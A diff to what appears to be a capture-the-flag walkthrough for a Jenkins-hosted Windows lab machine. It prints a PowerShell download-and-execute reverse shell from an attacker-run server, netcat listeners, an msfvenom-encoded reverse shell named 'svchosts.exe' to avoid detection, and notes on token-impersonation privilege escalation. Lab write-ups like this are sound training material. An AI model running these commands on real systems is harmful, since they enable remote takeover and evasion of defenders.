@@ -96,10 +96,10 @@ So it looks like Jenkins executes the commands as system but is access to a user
 python3 -m http.server
 ```
 
-* Start netcat listener on port 4444
+* Start netcat listener on port 4444 using rlwrap so that we can use the arrow keys to move around in the terminal once we get a shell.
 
 ```
-nc -lvnp 4444
+rlwrap nc -lvnp 4444
 ```
 
 * Update and build the following powershell that will transfer and execute the powershell script on the server.
@@ -108,3 +108,62 @@ nc -lvnp 4444
 powershell iex (New-Object Net.WebClient).DownloadString('http://Tun0-IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress Tun0-IP -Port 4444
 ```
 
+WIN!
+
+```
+rlwrap nc -lvnp 9000                                                                                                                                        9 ⚙
+listening on [any] 9000 ...
+connect to [10.6.40.191] from (UNKNOWN) [10.10.27.251] 49355
+```
+```ps
+Windows PowerShell running as user bruce on ALFRED
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Program Files (x86)\Jenkins\workspace\project>systeminfo
+```
+
+**What is the user.txt flag?**
+
+Now, we can begin looking for the user.txt flag! Use type user.txt to read the file in powershell.
+
+## Task 2: Switching Shells
+
+Now it's time to try and escalate our privileges. First, lets get an improved shell on the device. Let's use msfvenom to create a reverse shell. We're going to encode it and name it similarly to a legitimate binary service to avoid detection.
+
+'''
+msfvenom -p windows/shell_reverse_tcp LHOST=Tun0-IP LPORT=5555 -e x86/shikata_ga_nai -f exe -o svchosts.exe  
+'''
+
+**What is the final size of the exe payload that you generated?**
+
+After creating the payload we will see the final size for our fake service in the output.
+
+Now that we have our payload, we need to download it onto the device and access it through metasploit.
+
+Let's download it using our powershell session we got earlier with netcat off the server. Navigate to C:\Perflogs and then transfer the file off the server.
+
+```
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://Tun0-IP:8000/svchosts.exe','svchosts.exe')"
+```
+
+Now use ls to make sure it was transfered successfully. Perfect, we see svchosts.exe in PerfLogs.
+
+Let's jump over and start up a metasploit session using exploit/multi/handler before we launch the binary.
+
+Check to make sure the payload is correctly set to windows/meterpreter/reverse_tcp. It should be the default when opening msfconsole.
+
+Show options and set the LPORT to 5555, along with the LHOST to the Tun0-IP. Run the exploit and execute the binary on the device with the powershell session you have.
+
+```ps
+Start-Process "svchosts.exe" 
+```
+
+Now, check your listener in metasploit and you should see the command shell session opened. Let's go ahead and view privileges with whoami /priv.
+
+Luckily for us, we can see [SeDebugPrivilege, SeImpersonatePrivilege](https://www.exploit-db.com/papers/42556) are both enabled. Background the session, and use the metasploit incognito module. Unfortunately, it is still not a meterpreter shell though. We must use jenkins to run the binary as SYSTEM to get a meterpreter shell.
+
+```ps
+powershell Start-Process "svchosts.exe"
+```
+
+Unfortunately, I was unable to get this reverse shell to call back and it just hangs. This seemed to be a known issue for the room, so I will have to find another way to get a meterpreter shell.
